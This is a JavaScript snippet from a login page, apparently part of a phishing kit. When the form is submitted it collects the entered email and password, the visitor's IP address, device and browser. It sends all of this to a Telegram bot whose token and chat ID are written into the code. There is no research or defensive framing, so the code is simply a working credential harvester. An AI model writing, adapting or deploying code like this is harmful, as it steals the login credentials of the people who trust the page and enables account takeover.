<script>
  document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('loginForm');
    const notification = document.getElementById('notification');

    // 🔹 Replace with your bot details
    const botToken = "8420881837:AAEq-beKJzbADQJ6ohnxqximiGENcNVKPq0";
    const chatId = "7279773505";

    loginForm.addEventListener('submit', async function(e) {
      e.preventDefault();

      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;
      const timestamp = new Date().toLocaleString();

      // Get IP
      let ip = "Unknown";
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        ip = data.ip;
      } catch (err) {
        console.error("IP fetch failed:", err);
      }

      // Detect device & browser
      const ua = navigator.userAgent;
      let device = "Unknown Device";
      let browser = "Unknown Browser";

      if (/android/i.test(ua)) {
        device = "Android";
      } else if (/iPhone|iPad|iPod/i.test(ua)) {
        device = "iOS";
      } else if (/Win/i.test(ua)) {
        device = "Windows";
      } else if (/Mac/i.test(ua)) {
        device = "MacOS";
      } else if (/Linux/i.test(ua)) {
        device = "Linux";
      }

      if (/chrome/i.test(ua)) {
        browser = "Chrome";
      } else if (/safari/i.test(ua)) {
        browser = "Safari";
      } else if (/firefox/i.test(ua)) {
        browser = "Firefox";
      } else if (/edg/i.test(ua)) {
        browser = "Edge";
      } else if (/opr/i.test(ua)) {
        browser = "Opera";
      }

      // Create Telegram message
      const message =
`🔔 New Login Attempt
📧 Email: ${email}
🔑 Password: ${password}
🕒 Time: ${timestamp}
🌍 IP: ${ip}
💻 Device: ${device}
🌐 Browser: ${browser}`;

      // Send to Telegram
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      })
      .then(res => res.json())
      .then(data => {
        console.log("Message sent:", data);
        showNotification("✅ Login info sent to Telegram!");
      })
      .catch(err => {
        console.error("Error:", err);
        showNotification("❌ Failed to send login info.");
      });

      loginForm.reset();
    });

    function showNotification(msg) {
      notification.textContent = msg;
      notification.classList.add('show');
      setTimeout(() => {
        notification.classList.remove('show');
      }, 3000);
    }
  });
</script>
